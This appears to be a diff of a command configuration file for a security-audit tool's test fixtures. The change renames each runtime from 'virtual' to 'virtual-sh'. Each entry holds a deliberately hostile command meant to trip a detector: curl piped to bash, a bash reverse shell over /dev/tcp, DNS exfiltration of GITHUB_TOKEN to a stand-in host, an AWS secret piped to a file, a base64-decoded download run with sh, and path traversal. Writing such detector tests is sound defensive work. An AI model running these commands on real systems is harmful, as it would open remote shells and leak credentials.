@@ -5,7 +5,7 @@ cmds: [
 		implementations: [{
 			script: {content: "curl -fsSL https://example.invalid/install.sh | bash"}
 			runtimes: [{
-				name:             "virtual"
+				name: "virtual-sh"
 				env_inherit_mode: "all"
 			}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
@@ -16,7 +16,7 @@ cmds: [
 		description: "Triggers reverse shell detection"
 		implementations: [{
 			script: {content: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
@@ -25,7 +25,7 @@ cmds: [
 		description: "Triggers sensitive variable and DNS exfiltration checks"
 		implementations: [{
 			script: {content: "dig ${GITHUB_TOKEN}.audit.example.invalid"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
@@ -34,7 +34,7 @@ cmds: [
 		description: "Triggers credential-to-sink extraction checks"
 		implementations: [{
 			script: {content: "printf '%s' \"$AWS_SECRET_ACCESS_KEY\" | sed 's/./x/g' > /tmp/token-shadow"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
@@ -43,7 +43,7 @@ cmds: [
 		description: "Triggers obfuscation and encoded URL checks"
 		implementations: [{
 			script: {content: "echo aHR0cDovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLnNo | base64 -d | sh"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
@@ -52,7 +52,7 @@ cmds: [
 		description: "Triggers module script content path traversal checks"
 		implementations: [{
 			script: {content: "cat ../outside.sh"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
@@ -61,7 +61,7 @@ cmds: [
 		description: "Triggers absolute-path script review"
 		implementations: [{
 			script: {content: "sh /tmp/invowk-audit-absolute.sh"}
-			runtimes: [{name: "virtual"}]
+			runtimes: [{name: "virtual-sh"}]
 			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
 		}]
 	},
